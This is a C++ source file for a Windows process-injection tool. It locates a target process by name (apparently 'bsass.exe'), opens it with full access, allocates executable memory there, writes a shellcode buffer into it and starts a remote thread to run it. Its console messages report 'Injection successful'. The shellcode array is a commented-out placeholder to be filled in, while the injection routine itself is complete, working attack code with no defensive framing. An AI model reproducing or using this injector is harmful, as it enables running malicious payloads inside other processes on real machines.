#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <iostream>

// Apend the shellcode bytes here
// unsigned char shellcode[] = {};

int GetPIDByName(const std::wstring& procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe32)) {
            do {
                if (procName == pe32.szExeFile) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

int main() {
    std::wstring targetProcess = L"bsass.exe";

    std::wcout << L"[*] Looking for target process: " << targetProcess << std::endl;
    int pid = GetPIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Target process not found. Please open " << targetProcess.c_str() << " first." << std::endl;
        return 1;
    }

    std::cout << "[*] Found PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == NULL) {
        std::cerr << "[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    void* remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteMem == NULL) {
        std::cerr << "[-] VirtualAllocEx failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[*] Allocated memory at: " << remoteMem << std::endl;

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), &bytesWritten)) {
        std::cerr << "[-] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[*] Shellcode written (" << bytesWritten << " bytes)" << std::endl;

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);

    if (hThread == NULL) {
        std::cerr << "[-] CreateRemoteThread failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Injection successful! Payload should be running inside " << targetProcess.c_str() << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}